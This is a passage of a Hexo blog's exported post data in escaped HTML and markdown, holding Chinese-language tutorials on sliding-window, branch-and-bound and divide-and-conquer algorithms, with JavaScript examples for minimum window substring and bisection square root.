class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn</span>(<span class=\"params\">s, t</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> size = t.length;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> map = &#123;&#125;; <span class=\"comment\">// 存储目标串 t 中每个字符出现的次数</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> left = <span class=\"number\">0</span>; <span class=\"comment\">// 左指针</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> count = <span class=\"number\">0</span>; <span class=\"comment\">// 目标串 t 中每个字符出现一次加 1，当 `count === size` 时，出现覆盖子串（需进一步找出最小覆盖子串）</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> minLen = <span class=\"built_in\">Number</span>.MAX_VALUE; <span class=\"comment\">// 覆盖子串的长度</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"string\">&#x27;&#x27;</span>; <span class=\"comment\">// 保存最小覆盖子串结果</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; size; i++) &#123;</span><br><span class=\"line\">    map[t[i]] = +map[t[i]] ? map[t[i]] + <span class=\"number\">1</span> : <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; s.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (--map[s[i]] &gt;= <span class=\"number\">0</span>) count++;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (count === size) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (minLen &gt; i - left + <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        minLen = i - left + <span class=\"number\">1</span>;</span><br><span class=\"line\">        res = s.substr(left, minLen);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (++map[s[left]] &gt; <span class=\"number\">0</span>) count--;</span><br><span class=\"line\">      left++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(fn(<span class=\"string\">&#x27;ADCAFEGGD&#x27;</span>, <span class=\"string\">&#x27;ACE&#x27;</span>)); <span class=\"comment\">// CAFE </span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(fn(<span class=\"string\">&#x27;ADOBDCODEBANC&#x27;</span>, <span class=\"string\">&#x27;ABC&#x27;</span>)); <span class=\"comment\">// BANC</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(fn(<span class=\"string\">&#x27;aa&#x27;</span>, <span class=\"string\">&#x27;aa&#x27;</span>)); <span class=\"comment\">// aa</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"技巧篇-滑动窗口\"><a href=\"#技巧篇-滑动窗口\" class=\"headerlink\" title=\"技巧篇 - 滑动窗口\"></a>技巧篇 - 滑动窗口</h1><p>滑动窗口问题经常使用双指针，定义两个变量left、right（只能向右移动），来标示一个窗口的大小，通过移动右指针找到<strong>问题的解</strong>，移动左指针找到<strong>问题的最优解</strong></p>\n<ul>\n<li>[0, slow) 的区域为滑动窗口已经探索过的区域</li>\n<li>[slow, fast]的区域为滑动窗口正在探索的区域</li>\n<li>(fast, end of array)为待探索的区域</li>\n</ul>\n<hr>\n<ul>\n<li>固定大小的滑动窗口: 当快指针增加的时候慢指针必须增加</li>\n<li>非固定大小的滑动窗口: 快指针增加，慢指针不一定变化</li>\n</ul>\n<h3 id=\"长度为-K-的子数组的最大值\"><a href=\"#长度为-K-的子数组的最大值\" class=\"headerlink\" title=\"长度为 K 的子数组的最大值\"></a>长度为 K 的子数组的最大值</h3><p><strong>问题：</strong>给定一组大小为 n 的整数数组， 计算长度为 k 的子数组和的最大值。</p>\n<p><strong>示例：</strong><br>输入: a = [-1, 4, 7, -3, 8, 5, -2, 6],  k = 3<br>输出: 12 // [7, -3, 8]</p>\n<p><strong>思路：</strong></p>\n<ol>\n<li>先计算前 k 个值的总和</li>\n<li>从第 k 个数到 n 个数，每次往数组末尾增加 1 个数的同时，减去第 1 个数（即只增加差值）</li>\n<li>遍历的过程中，保存较大的值作为结果</li>\n</ol>\n<h3 id=\"最小覆盖子串\"><a href=\"#最小覆盖子串\" class=\"headerlink\" title=\"最小覆盖子串\"></a>最小覆盖子串</h3><p><strong>问题：</strong>给定一个字符串 S 和一个字符串 T，请在 S 中找出包含 T 所有字母的最小子串。</p>\n<p><strong>示例：</strong><br>输入: S = “ADOBECODEBANC”, T = “ABC”<br>输出: “BANC”</p>\n<p><strong>思路：</strong></p>\n<ol>\n<li>先扫描一遍 T，把对应的字符及其出现的次数存到 HashMap 中</li>\n<li>然后遍历 S，把遍历到的字母对应的 HashMap 中的 value 减 1，如果减 1 后仍大于等于 0（说明是 T 中的字符），count 自增 1<ol>\n<li>完全找到每个 T 中的每个字符时，HashMap 中 在 T 中的每个字符对应的值为 0，其余的值为负数</li>\n<li>此时 <code>count === T.length</code>，找到覆盖子串</li>\n</ol>\n</li>\n<li>左指针向右移动从覆盖子串中寻找最小覆盖子串，并将每次匹配到的覆盖子串的结果保存下来<ol>\n<li>左指针向右移动时，HashMap 中每个字符自加1</li>\n<li>如果是 T 中的字符，则自加后值为 1 （-n…0 –&gt; 1），自加后如果小于等于 0 ，说明之前的覆盖子串中有相同的字符，剔除该字符后依然是覆盖子串</li>\n<li>如果不是 T 中的字符，则自加后值为 0 （-n…-1 –&gt; 0），左指针继续向右移动，寻找更短的覆盖子串</li>\n</ol>\n</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn</span>(<span class=\"params\">s, t</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> size = t.length;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> map = &#123;&#125;; <span class=\"comment\">// 存储目标串 t 中每个字符出现的次数</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> left = <span class=\"number\">0</span>; <span class=\"comment\">// 左指针</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> count = <span class=\"number\">0</span>; <span class=\"comment\">// 目标串 t 中每个字符出现一次加 1，当 `count === size` 时，出现覆盖子串（需进一步找出最小覆盖子串）</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> minLen = <span class=\"built_in\">Number</span>.MAX_VALUE; <span class=\"comment\">// 覆盖子串的长度</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> res = <span class=\"string\">&#x27;&#x27;</span>; <span class=\"comment\">// 保存最小覆盖子串结果</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; size; i++) &#123;</span><br><span class=\"line\">    map[t[i]] = +map[t[i]] ? map[t[i]] + <span class=\"number\">1</span> : <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; s.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (--map[s[i]] &gt;= <span class=\"number\">0</span>) count++;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (count === size) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (minLen &gt; i - left + <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        minLen = i - left + <span class=\"number\">1</span>;</span><br><span class=\"line\">        res = s.substr(left, minLen);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (++map[s[left]] &gt; <span class=\"number\">0</span>) count--;</span><br><span class=\"line\">      left++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(fn(<span class=\"string\">&#x27;ADCAFEGGD&#x27;</span>, <span class=\"string\">&#x27;ACE&#x27;</span>)); <span class=\"comment\">// CAFE </span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(fn(<span class=\"string\">&#x27;ADOBDCODEBANC&#x27;</span>, <span class=\"string\">&#x27;ABC&#x27;</span>)); <span class=\"comment\">// BANC</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(fn(<span class=\"string\">&#x27;aa&#x27;</span>, <span class=\"string\">&#x27;aa&#x27;</span>)); <span class=\"comment\">// aa</span></span><br></pre></td></tr></table></figure>"},{"title":"算法范式 - 分支限界法","date":"2021-06-01T08:32:28.000Z","_content":"\n# 算法范式 - 分支限界法\n\n### 基本概念\n\n分支限界法是从根开始，常以广度优先或以最小耗费(最大效益)优先的方式搜索问题的解空间树。\n\n首先将根结点加入活结点表(用于存放活结点的数据结构)，接着从活结点表中取出根结点，使其成为当前扩展结点，一次性生成其所有孩子结点，判断孩子结点是舍弃还是保留，舍弃那些导致不可行解或导致非最优解的孩子结点，其余的被保留在活结点表中。再从活结点表中取出一个活结点作为当前扩展结点，重复上述扩展过程，直到找到所需的解或活结点表为空时为止。\n\n由此可见，每一个活结点最多只有-次机会成为扩展结点。活结点表的实现通常有两种形式:\n* 一种是普通的队列，即先进先出队列\n* 一种是优先级队列，按照某种优先级决定哪个结点为当前扩展结点，优先队列一般使用二叉堆来实现\n  * 最大堆实现最大优先队列，即优先级数值越大越优先，通常表示最大效益优先\n  * 最小堆实现最小优先队列，即优先级数值越小越优先，通常表示最小耗费优先\n\n分支限界法也分为两种:\n* 队列式分支限界法\n* 优先队列式分支限界法\n\n\n### 实现步骤\n1. 定义问题的解空间\n2. 确定问题的解空间组织结构\n3. 搜索解空间。搜索前要定义判断标准(约束函数或限界函数)，如果选用优先队列式分支限界法，则必须确定优先级。\n\n\n### 回溯法与分支限界法的异同点\n**相同点**\n* 均需要先定义问题的解空间，确定的解空间组织结构--般都是树或图。\n* 在问题的解空间树上搜索问题解。\n* 搜索前均需确定判断条件，该判断条件用于判断扩展生成的结点是否为可行结点。\n* 搜索过程中必须判断扩展生成的结点是否满足判断条件，如果满足，则保留该扩展\n生成的结点，否则舍弃。\n\n**不同点**\n* 搜索目标: 回溯法的求解目标是找出解空间树中满足约束条件的所有解，而分支限\n界法的求解目标则是找出满足约束条件的一个解，或是在满足约束条件的解中找出在某种意\n义下的最优解。\n* 搜索方式不同: 回溯法以深度优先的方式搜索解空间树，而分支限界法则以广度优\n先或以最小耗费优先的方式搜索解空间树。\n* 扩展方式不同: 在回溯法搜索中，扩展结点一次生成一个孩子结点，而在分支限界\n法搜索中，扩展结点一次生成它所有的孩子结点。","source":"_posts/算法范式/算法范式 - 分支限界法.md","raw":"---\ntitle: 算法范式 - 分支限界法\ncategories: 算法范式\ntags: [算法范式]\ndate: 2021-06-01 16:32:28\n---\n\n# 算法范式 - 分支限界法\n\n### 基本概念\n\n分支限界法是从根开始，常以广度优先或以最小耗费(最大效益)优先的方式搜索问题的解空间树。\n\n首先将根结点加入活结点表(用于存放活结点的数据结构)，接着从活结点表中取出根结点，使其成为当前扩展结点，一次性生成其所有孩子结点，判断孩子结点是舍弃还是保留，舍弃那些导致不可行解或导致非最优解的孩子结点，其余的被保留在活结点表中。再从活结点表中取出一个活结点作为当前扩展结点，重复上述扩展过程，直到找到所需的解或活结点表为空时为止。\n\n由此可见，每一个活结点最多只有-次机会成为扩展结点。活结点表的实现通常有两种形式:\n* 一种是普通的队列，即先进先出队列\n* 一种是优先级队列，按照某种优先级决定哪个结点为当前扩展结点，优先队列一般使用二叉堆来实现\n  * 最大堆实现最大优先队列，即优先级数值越大越优先，通常表示最大效益优先\n  * 最小堆实现最小优先队列，即优先级数值越小越优先，通常表示最小耗费优先\n\n分支限界法也分为两种:\n* 队列式分支限界法\n* 优先队列式分支限界法\n\n\n### 实现步骤\n1. 定义问题的解空间\n2. 确定问题的解空间组织结构\n3. 搜索解空间。搜索前要定义判断标准(约束函数或限界函数)，如果选用优先队列式分支限界法，则必须确定优先级。\n\n\n### 回溯法与分支限界法的异同点\n**相同点**\n* 均需要先定义问题的解空间，确定的解空间组织结构--般都是树或图。\n* 在问题的解空间树上搜索问题解。\n* 搜索前均需确定判断条件，该判断条件用于判断扩展生成的结点是否为可行结点。\n* 搜索过程中必须判断扩展生成的结点是否满足判断条件，如果满足，则保留该扩展\n生成的结点，否则舍弃。\n\n**不同点**\n* 搜索目标: 回溯法的求解目标是找出解空间树中满足约束条件的所有解，而分支限\n界法的求解目标则是找出满足约束条件的一个解，或是在满足约束条件的解中找出在某种意\n义下的最优解。\n* 搜索方式不同: 回溯法以深度优先的方式搜索解空间树，而分支限界法则以广度优\n先或以最小耗费优先的方式搜索解空间树。\n* 扩展方式不同: 在回溯法搜索中，扩展结点一次生成一个孩子结点，而在分支限界\n法搜索中，扩展结点一次生成它所有的孩子结点。","slug":"算法范式/算法范式 - 分支限界法","published":1,"updated":"2021-06-07T11:29:49.390Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjarf00000xv6rdwpy8wm2","content":"<h1 id=\"算法范式-分支限界法\"><a href=\"#算法范式-分支限界法\" class=\"headerlink\" title=\"算法范式 - 分支限界法\"></a>算法范式 - 分支限界法</h1><h3 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h3><p>分支限界法是从根开始，常以广度优先或以最小耗费(最大效益)优先的方式搜索问题的解空间树。</p>\n<p>首先将根结点加入活结点表(用于存放活结点的数据结构)，接着从活结点表中取出根结点，使其成为当前扩展结点，一次性生成其所有孩子结点，判断孩子结点是舍弃还是保留，舍弃那些导致不可行解或导致非最优解的孩子结点，其余的被保留在活结点表中。再从活结点表中取出一个活结点作为当前扩展结点，重复上述扩展过程，直到找到所需的解或活结点表为空时为止。</p>\n<p>由此可见，每一个活结点最多只有-次机会成为扩展结点。活结点表的实现通常有两种形式:</p>\n<ul>\n<li>一种是普通的队列，即先进先出队列</li>\n<li>一种是优先级队列，按照某种优先级决定哪个结点为当前扩展结点，优先队列一般使用二叉堆来实现<ul>\n<li>最大堆实现最大优先队列，即优先级数值越大越优先，通常表示最大效益优先</li>\n<li>最小堆实现最小优先队列，即优先级数值越小越优先，通常表示最小耗费优先</li>\n</ul>\n</li>\n</ul>\n<p>分支限界法也分为两种:</p>\n<ul>\n<li>队列式分支限界法</li>\n<li>优先队列式分支限界法</li>\n</ul>\n<h3 id=\"实现步骤\"><a href=\"#实现步骤\" class=\"headerlink\" title=\"实现步骤\"></a>实现步骤</h3><ol>\n<li>定义问题的解空间</li>\n<li>确定问题的解空间组织结构</li>\n<li>搜索解空间。搜索前要定义判断标准(约束函数或限界函数)，如果选用优先队列式分支限界法，则必须确定优先级。</li>\n</ol>\n<h3 id=\"回溯法与分支限界法的异同点\"><a href=\"#回溯法与分支限界法的异同点\" class=\"headerlink\" title=\"回溯法与分支限界法的异同点\"></a>回溯法与分支限界法的异同点</h3><p><strong>相同点</strong></p>\n<ul>\n<li>均需要先定义问题的解空间，确定的解空间组织结构–般都是树或图。</li>\n<li>在问题的解空间树上搜索问题解。</li>\n<li>搜索前均需确定判断条件，该判断条件用于判断扩展生成的结点是否为可行结点。</li>\n<li>搜索过程中必须判断扩展生成的结点是否满足判断条件，如果满足，则保留该扩展<br>生成的结点，否则舍弃。</li>\n</ul>\n<p><strong>不同点</strong></p>\n<ul>\n<li>搜索目标: 回溯法的求解目标是找出解空间树中满足约束条件的所有解，而分支限<br>界法的求解目标则是找出满足约束条件的一个解，或是在满足约束条件的解中找出在某种意<br>义下的最优解。</li>\n<li>搜索方式不同: 回溯法以深度优先的方式搜索解空间树，而分支限界法则以广度优<br>先或以最小耗费优先的方式搜索解空间树。</li>\n<li>扩展方式不同: 在回溯法搜索中，扩展结点一次生成一个孩子结点，而在分支限界<br>法搜索中，扩展结点一次生成它所有的孩子结点。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"算法范式-分支限界法\"><a href=\"#算法范式-分支限界法\" class=\"headerlink\" title=\"算法范式 - 分支限界法\"></a>算法范式 - 分支限界法</h1><h3 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h3><p>分支限界法是从根开始，常以广度优先或以最小耗费(最大效益)优先的方式搜索问题的解空间树。</p>\n<p>首先将根结点加入活结点表(用于存放活结点的数据结构)，接着从活结点表中取出根结点，使其成为当前扩展结点，一次性生成其所有孩子结点，判断孩子结点是舍弃还是保留，舍弃那些导致不可行解或导致非最优解的孩子结点，其余的被保留在活结点表中。再从活结点表中取出一个活结点作为当前扩展结点，重复上述扩展过程，直到找到所需的解或活结点表为空时为止。</p>\n<p>由此可见，每一个活结点最多只有-次机会成为扩展结点。活结点表的实现通常有两种形式:</p>\n<ul>\n<li>一种是普通的队列，即先进先出队列</li>\n<li>一种是优先级队列，按照某种优先级决定哪个结点为当前扩展结点，优先队列一般使用二叉堆来实现<ul>\n<li>最大堆实现最大优先队列，即优先级数值越大越优先，通常表示最大效益优先</li>\n<li>最小堆实现最小优先队列，即优先级数值越小越优先，通常表示最小耗费优先</li>\n</ul>\n</li>\n</ul>\n<p>分支限界法也分为两种:</p>\n<ul>\n<li>队列式分支限界法</li>\n<li>优先队列式分支限界法</li>\n</ul>\n<h3 id=\"实现步骤\"><a href=\"#实现步骤\" class=\"headerlink\" title=\"实现步骤\"></a>实现步骤</h3><ol>\n<li>定义问题的解空间</li>\n<li>确定问题的解空间组织结构</li>\n<li>搜索解空间。搜索前要定义判断标准(约束函数或限界函数)，如果选用优先队列式分支限界法，则必须确定优先级。</li>\n</ol>\n<h3 id=\"回溯法与分支限界法的异同点\"><a href=\"#回溯法与分支限界法的异同点\" class=\"headerlink\" title=\"回溯法与分支限界法的异同点\"></a>回溯法与分支限界法的异同点</h3><p><strong>相同点</strong></p>\n<ul>\n<li>均需要先定义问题的解空间，确定的解空间组织结构–般都是树或图。</li>\n<li>在问题的解空间树上搜索问题解。</li>\n<li>搜索前均需确定判断条件，该判断条件用于判断扩展生成的结点是否为可行结点。</li>\n<li>搜索过程中必须判断扩展生成的结点是否满足判断条件，如果满足，则保留该扩展<br>生成的结点，否则舍弃。</li>\n</ul>\n<p><strong>不同点</strong></p>\n<ul>\n<li>搜索目标: 回溯法的求解目标是找出解空间树中满足约束条件的所有解，而分支限<br>界法的求解目标则是找出满足约束条件的一个解，或是在满足约束条件的解中找出在某种意<br>义下的最优解。</li>\n<li>搜索方式不同: 回溯法以深度优先的方式搜索解空间树，而分支限界法则以广度优<br>先或以最小耗费优先的方式搜索解空间树。</li>\n<li>扩展方式不同: 在回溯法搜索中，扩展结点一次生成一个孩子结点，而在分支限界<br>法搜索中，扩展结点一次生成它所有的孩子结点。</li>\n</ul>\n"},{"title":"算法范式 - 分治法","date":"2021-06-01T08:32:28.000Z","_content":"\n# 算法范式 - 分治法\n\n### 概念\n当求解的问题较复杂或规模较大时，不能立刻得到原问题的解，但这些问题本身具有这样的特点，它可以分解为若干个与原问题性质相类似的子问题，而这些子问题较简单可方便得到它们的解，因此通过合并这些子问题的解就可得到原问题的解。\n\n> 任何一个可以用计算机求解的问题所需的计算时间都与其规模有关。问题的规模越小，越容易直接求解，解题所需的计算时间也越少。例如，对于n个元素的排序问题，当n=1时，不需任何计算。n=2时，只要作一次比较即可排好序。n=3时只要作3次比较即可，…。而当n较大时，问题就不那么容易处理了。要想直接解决一个规模较大的问题，有时是相当困难的。\n\n### 基本步骤\n* 分解问题(divide)：把原问题分解为若干个与原问题性质相类似的子问题\n* 求解子问题(conquer)：不断分解子问题直到可方便求出子问题的解为止\n* 合并子问题的解(combine)：合并子问题的解得到原问题的解\n\n### 使用场景\n* 原问题可以分解为若干个与原问题性质相类似的子问题\n* 问题的规模缩小到一定程度后可方便求出解\n* 子问题的解可以合并得到原问题的解\n* 分解出的各个子问题应相互独立，即不包含重叠子问题\n\n### 案例题\n* 有序数组查找（二分法）\n* 求根号\n* 快速排序、归并排序\n\n\n```js\n/**\n * 找到一个数字在指定精度内的平方根\n * \n * @param num 数字\n * @param pricision 精度\n */\n\nfunction sqrt(num, pricision) {\n  let up = num > 1 ? num : 1;\n  let down = 0;\n  let n;\n\n  while(true) {\n    n = (down + up) / 2;\n    if (n * n - num <= pricision && n * n - num >= 0) break;\n    if (n * n - num > pricision) up = n;\n    if (n * n - num < 0) down = n;\n  }\n\n  return n;\n}\n\nsqrt(10, 0.001); // 3.162384033203125\n```","source":"_posts/算法范式/算法范式 - 分治法.md","raw":"---\ntitle: 算法范式 - 分治法\ncategories: 算法范式\ntags: [算法范式]\ndate: 2021-06-01 16:32:28\n---\n\n# 算法范式 - 分治法\n\n### 概念\n当求解的问题较复杂或规模较大时，不能立刻得到原问题的解，但这些问题本身具有这样的特点，它可以分解为若干个与原问题性质相类似的子问题，而这些子问题较简单可方便得到它们的解，因此通过合并这些子问题的解就可得到原问题的解。\n\n> 任何一个可以用计算机求解的问题所需的计算时间都与其规模有关。问题的规模越小，越容易直接求解，解题所需的计算时间也越少。例如，对于n个元素的排序问题，当n=1时，不需任何计算。n=2时，只要作一次比较即可排好序。n=3时只要作3次比较即可，…。而当n较大时，问题就不那么容易处理了。要想直接解决一个规模较大的问题，有时是相当困难的。\n\n### 基本步骤\n* 分解问题(divide)：把原问题分解为若干个与原问题性质相类似的子问题\n* 求解子问题(conquer)：不断分解子问题直到可方便求出子问题的解为止\n* 合并子问题的解(combine)：合并子问题的解得到原问题的解\n\n### 使用场景\n* 原问题可以分解为若干个与原问题性质相类似的子问题\n* 问题的规模缩小到一定程度后可方便求出解\n* 子问题的解可以合并得到原问题的解\n* 分解出的各个子问题应相互独立，即不包含重叠子问题\n\n### 案例题\n* 有序数组查找（二分法）\n* 求根号\n* 快速排序、归并排序\n\n\n```js\n/**\n * 找到一个数字在指定精度内的平方根\n * \n * @param num 数字\n * @param pricision 精度\n */\n\nfunction sqrt(num, pricision) {\n  let up = num > 1 ? num : 1;\n  let down = 0;\n  let n;\n\n  while(true) {\n    n = (down + up) / 2;\n    if (n * n - num <= pricision && n * n - num >= 0) break;\n    if (n * n - num > pricision) up = n;\n    if (n * n - num < 0) down = n;\n  }\n\n  return n;\n}\n\nsqrt(10, 0.001); // 3.162384033203125\n```","slug":"算法范式/算法范式 - 分治法","published":1,"updated":"2021-06-07T11:30:59.302Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjarf50001xv6r2o9u9yib","content":"<h1 id=\"算法范式-分治法\"><a href=\"#算法范式-分治法\" class=\"headerlink\" title=\"算法范式 - 分治法\"></a>算法范式 - 分治法</h1><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>当求解的问题较复杂或规模较大时，不能立刻得到原问题的解，但这些问题本身具有这样的特点，它可以分解为若干个与原问题性质相类似的子问题，而这些子问题较简单可方便得到它们的解，因此通过合并这些子问题的解就可得到原问题的解。</p>\n<blockquote>\n<p>任何一个可以用计算机求解的问题所需的计算时间都与其规模有关。问题的规模越小，越容易直接求解，解题所需的计算时间也越少。例如，对于n个元素的排序问题，当n=1时，不需任何计算。n=2时，只要作一次比较即可排好序。n=3时只要作3次比较即可，…。而当n较大时，问题就不那么容易处理了。要想直接解决一个规模较大的问题，有时是相当困难的。</p>\n</blockquote>\n<h3 id=\"基本步骤\"><a href=\"#基本步骤\" class=\"headerlink\" title=\"基本步骤\"></a>基本步骤</h3><ul>\n<li>分解问题(divide)：把原问题分解为若干个与原问题性质相类似的子问题</li>\n<li>求解子问题(conquer)：不断分解子问题直到可方便求出子问题的解为止</li>\n<li>合并子问题的解(combine)：合并子问题的解得到原问题的解</li>\n</ul>\n<h3 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h3><ul>\n<li>原问题可以分解为若干个与原问题性质相类似的子问题</li>\n<li>问题的规模缩小到一定程度后可方便求出解</li>\n<li>子问题的解可以合并得到原问题的解</li>\n<li>分解出的各个子问题应相互独立，即不包含重叠子问题</li>\n</ul>\n<h3 id=\"案例题\"><a href=\"#案例题\" class=\"headerlink\" title=\"案例题\"></a>案例题</h3><ul>\n<li>有序数组查找（二分法）</li>\n<li>求根号</li>\n<li>快速排序、归并排序</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 找到一个数字在指定精度内的平方根</span></span><br><span class=\"line\"><span class=\"comment\"> * </span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param </span>num 数字</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param </span>pricision 精度</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sqrt</span>(<span class=\"params\">num, pricision</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> up = num &gt; <span class=\"number\">1</span> ? num : <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> down = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> n;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">    n = (down + up) / <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n * n - num &lt;= pricision &amp;&amp; n * n - num &gt;= <span class=\"number\">0</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n * n - num &gt; pricision) up = n;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n * n - num &lt; <span class=\"number\">0</span>) down = n;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">sqrt(<span class=\"number\">10</span>, <span class=\"number\">0.001</span>); <span class=\"comment\">// 3.162384033203125</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"算法范式-分治法\"><a href=\"#算法范式-分治法\" class=\"headerlink\" title=\"算法范式 - 分治法\"></a>算法范式 - 分治法</h1><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>当求解的问题较复杂或规模较大时，不能立刻得到原问题的解，但这些问题本身具有这样的特点，它可以分解为若干个与原问题性质相类似的子问题，而这些子问题较简单可方便得到它们的解，因此通过合并这些子问题的解就可得到原问题的解。</p>\n<blockquote>\n<p>任何一个可以用计算机求解的问题所需的计算时间都与其规模有关。问题的规模越小，越容易直接求解，解题所需的计算时间也越少。例如，对于n个元素的排序问题，当n=1时，不需任何计算。n=2时，只要作一次比较即可排好序。n=3时只要作3次比较即可，…。而当n较大时，问题就不那么容易处理了。要想直接解决一个规模较大的问题，有时是相当困难的。</p>\n</blockquote>\n<h3 id=\"基本步骤\"><a href=\"#基本步骤\" class=\"headerlink\" 